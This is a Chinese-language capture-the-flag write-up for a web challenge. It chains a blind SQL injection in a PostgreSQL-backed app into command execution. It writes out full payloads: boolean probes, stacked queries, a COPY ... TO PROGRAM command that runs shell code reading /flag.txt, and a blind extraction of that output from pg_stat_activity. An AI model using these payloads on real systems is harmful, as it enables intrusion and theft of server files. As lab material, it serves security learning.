# 分析-Planetary-Probe

**题目：**
```
The Galactic Federation has opened public access to its Planetary Probe Directory, a database of known planets and their telemetry signatures. Your mission is to interface with the probe console and uncover hidden data the Federation would rather keep secret.

The console seems… minimal. No verbose errors, no detailed output — just “signal detected” or “no signal”. Can you find a way to communicate with the system, bypass its limited responses, and recover the hidden flag?

https://planetary.web.2026.sunshinectf.games/
```

## 基本信息

| 项 | 值 |
|---|---|
| 赛事 | SunshineCTF 2026（Web；2026-09-27 实测） |
| 目标 | `https://planetary.web.2026.sunshinectf.games/` |
| 站点伪装 | Bureau of Planetary Telemetry —— 行星信号接收机（输入代号 → "Signal detected" / "No signal"） |
| 技术栈 | nginx 前置 + SQL 裸拼接应用；后端 **PostgreSQL**（注入模板：`SELECT id FROM planets WHERE name = '<input>'`） |
| 分析路径 | 纯黑盒（无附件） |
| 核心考点 | 单比特盲 SQLi → PostgreSQL 枚举 → 只读库下 `COPY ... TO PROGRAM` RCE → psql 会话 query 文本当外带通道 |
| Flag | `sun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}` |

## 攻击链

### 1. 单比特盲 oracle

- 首页表单 → `GET /probe?planet=<代号>`；响应仅两种状态：`<body class="is-carrier">`（Signal detected）/ `is-null`（No signal）。
- `earth' AND 1=1-- -` → carrier，`earth' AND 1=2-- -` → null ⇒ 布尔盲注成立。
- **服务端把输入整体转小写**后再拼接进 SQL（证据：`'ZZ'='zz'` 为真；`ascii('A')=65` 为假——转小写后是 `ascii('a')=97`；`version() LIKE 'PostgreSQL%'` 为假而 `'postgresql%'` 可推）。⇒ 所有 payload 必须全小写（`-U` 等大写选项会被破坏，需用长选项）。

### 2. 引擎指纹 = PostgreSQL

| 探针 | 结果 |
|---|---|
| `chr(65)` / `current_database()` / `quote_ident('a')` / `'abc'~'b'` / `'5'::int=5` / `pg_backend_pid()` | 可求值（carrier） |
| `information_schema.tables` | 可查询 |
| `sqlite_version()` / `sqlite_master` / `@@version_comment` | 报错（null） |

### 3. 枚举（盲读：`ascii(substr(...))` 二分）

- public schema 共 2 张表：
  - `planets(id, name, diameter_km, description)`，8 行 = 太阳系八大行星；
  - `zleak(v)`，2 行（盲注 `count(*)` 实测）：一行值 = 字面量 `select v from zleak`（**诱饵**，无 flag），另一行 `rwtest`（作者初始化写测试残留，见 §4）。
- 地球 description 里藏了个 U+2014（—）破折号，无实际意义。
- pg_stat_activity 中读到注入模板：`SELECT id FROM planets WHERE name = '<input>'`。

### 4. 权限画像与只读库（路线分叉点）

- `default_transaction_read_only=on`：INSERT / UPDATE / CREATE / COPY 入库全部被拒（连 postgres 用户也写不了）⇒ 排除"写表回显"路线；`zleak` 里的 `rwtest` 行是作者初始化时的写测试残留。
- `probe`（应用账号）权限：**仅 SELECT**；无 `pg_read_server_files` / `pg_write_server_files`；但**是 `pg_execute_server_program` 成员** ⇒ `COPY ... TO PROGRAM` 的钥匙（题目给的唯一出口）。

### 5. 堆叠语句 → RCE

- `earth'; SELECT 'aa'; --` → carrier ⇒ 多语句堆叠可用（应用取最后一条语句的结果）。
- `earth'; COPY (SELECT 'x') TO PROGRAM 'sleep 4'; SELECT 'aa'; --` 耗时 4.6s（基线 1.3s）⇒ 命令执行确认，程序以 OS 用户 `postgres` 运行。
- 环境：`whoami`=postgres；`curl` 有、`nc`/`python3` 无。

### 6. psql 载具与角色可见性

- COPY 程序以 OS 用户 postgres 运行；`psql --username=probe --dbname=spacedb`（应用账号，本地免密）可稳定连接与执行。
- **关键机制**：pg_stat_activity 对**非同角色**会话隐藏 query 文本（显示 `<insufficient privilege>`、state 为 NULL——probe 无 `pg_read_all_stats`）。默认用户（postgres 角色）起的 psql 会话读不到内容，表现为"会话不存在"。因此载具 psql 必须与注入会话**同角色**连接（`--username=probe`），否则外带通道不可读。
- 排查提示：判定"命令是否执行"不能只看 query 文本可见性——用同角色载具交叉验证，或按 `usename` 做行级计数。

### 7. 只读库下的外带通道：pg_stat_activity.query

无法写表、无法写文件、出网未验证成功，于是把 **psql 会话自身的 query 文本**当数据载具：

```sql
earth'; COPY (SELECT 'x') TO PROGRAM
  'psql --username=probe --dbname=spacedb -c
   "select pg_sleep(9182) /* $(cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || echo NOFLAGFILE) */"';
SELECT 'aa'; --
```

- shell 在 psql 启动前完成 `$(cat /flag.txt)` 替换 → flag 进入 psql 发送的 SQL 文本 → 常驻 `pg_stat_activity.query`。
- `pg_sleep(9182)` 撑 2.5 小时；HTTP 网关 60s 超时只断客户端，**服务端 psql 会话继续执行**。
- 盲 oracle 逐字符读回：`substr(query, position('sun{' in query)+4)` + `ascii()` 二分，14 线程并行，遇 `}` 停止。（读取前提：载具与读取方同角色，见 §6）

### 8. 读取侧陷阱（最费时的一课）

- "查询 pg_stat_activity 找自己"天然会把**检查请求自身**匹配上（请求文本里含 marker / `%sun{%` 字面量）⇒ 计数、`LIKE` 全是假阳性，一度误判"sleeper 持久化成功 / flag 已在库中"。
- 修复组合拳：
  1. `pid <> pg_backend_pid()` 排除当前请求；
  2. 并行提取时必须用**行首前缀**过滤（`query LIKE 'select pg_sleep(9182)%'`）——oracle 请求以 `SELECT id FROM planets...` 开头，永不匹配；
  3. 后台化可用且推荐（`nohup ... &` 让 COPY 快速返回，避免长挂请求占用应用 worker）；但必须带 `--username=probe`——默认用户会话对 probe 不可见（见 §6）。
  4. 连接池 idle 连接会**保留最后一条 query 文本**——用 `LIKE '%marker%'` 判定"存在性"会命中已完成的请求（假阳性）；存在性判定用行首前缀过滤。

**Flag：** `sun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}`（`/flag.txt`，2026-09-27 实测提取）
